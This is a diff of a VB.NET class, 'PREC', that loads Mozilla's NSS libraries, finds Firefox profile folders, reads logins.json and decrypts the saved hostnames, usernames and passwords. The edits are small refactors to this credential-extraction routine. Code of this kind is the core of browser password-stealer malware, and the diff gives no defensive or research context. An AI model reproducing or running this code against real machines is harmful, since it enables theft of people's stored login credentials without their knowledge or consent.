@@ -120,23 +120,17 @@ Class PREC
     Private Shared Function LoadLibrary(ByVal dllFilePath As String) As IntPtr
     End Function
 
-    <DllImport("kernel32.dll", SetLastError:=True, EntryPoint:="FreeLibrary")> _
+    <DllImport("kernel32.dll", SetLastError:=True, EntryPoint:="FreeLibrary")>
     Private Shared Function FreeLibrary(ByVal hModule As IntPtr) As Boolean
-    End Function
-
-    <DllImport("Kernel32.dll", SetLastError:=True, CallingConvention:=CallingConvention.Winapi)> _
-    Private Shared Function IsWow64Process( _
-    ByVal hProcess As IntPtr, _
-    ByRef wow64Process As Boolean) As <MarshalAs(UnmanagedType.Bool)> Boolean
     End Function
 
     <DllImport("kernel32.dll", SetLastError:=True, CharSet:=CharSet.Ansi, ExactSpelling:=True)> _
     Private Shared Function GetProcAddress(ByVal hModule As IntPtr, ByVal procName As String) As IntPtr
     End Function
 
-    Private Function CreateAPI(Of T)(ByVal name As String, ByVal method As String) As T
-        Return CreateAPI(Of T)(LoadLibrary(name), method)
-    End Function
+    'Private Function CreateAPI(Of T)(ByVal name As String, ByVal method As String) As T
+    '    Return CreateAPI(Of T)(LoadLibrary(name), method)
+    'End Function
 
     Private Function CreateAPI(Of T)(ByVal hModule As IntPtr, ByVal method As String) As T 'Simple overload to avoid loading the same library every time
         On Error Resume Next
@@ -234,7 +228,7 @@ Class PREC
         Dim sb As New StringBuilder(str)
         Dim mozDecodeBuffer As Integer = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, sb, sb.Length)
         mozSEC = New TSECItem
-        mozSEC2 = CType(Marshal.PtrToStructure(New IntPtr(mozDecodeBuffer), GetType(TSECItem)), TSECItem)
+        mozSEC2 = Marshal.PtrToStructure(New IntPtr(mozDecodeBuffer), GetType(TSECItem))
         If PK11SDR_Decrypt(mozSEC2, mozSEC, 0) = 0 Then
             If mozSEC.SECItemLen <> 0 Then
                 Dim mozDecryptedData = New Byte(mozSEC.SECItemLen - 1) {}
@@ -251,7 +245,7 @@ Class PREC
                 Dim mozProfilePath As String = FindFirefoxProfilePath(AppData)
                 If Not IO.Directory.Exists(mozProfilePath) Then Continue For
                 Dim mozLogins = IO.File.ReadAllText(mozProfilePath & "\logins.json")
-                NSS_Init(mozProfilePath & "\")
+                NSS_Init(mozProfilePath)
                 Dim keySlot As Long = PK11_GetInternalKeySlot()
                 PK11_Authenticate(keySlot, True, 0)
                 Dim JSONRegex As New Regex("\""(hostname|encryptedPassword|encryptedUsername)"":""(.*?)""")
